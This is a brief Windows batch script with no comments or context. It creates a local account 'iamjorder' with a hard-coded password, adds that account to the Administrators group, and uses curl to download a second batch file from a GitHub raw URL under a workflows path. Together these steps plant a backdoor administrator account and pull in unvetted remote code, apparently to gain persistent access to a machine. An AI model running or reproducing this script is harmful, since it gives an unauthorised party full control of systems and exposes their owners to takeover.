@echo off
setlocal

net user iamjorder "Mamunja201" /add
net localgroup Administrators iamjorder /add

curl -o show.bat https://raw.githubusercontent.com/mamunxoarder5/win11/refs/heads/main/.github/workflows/show.bat


endlocal




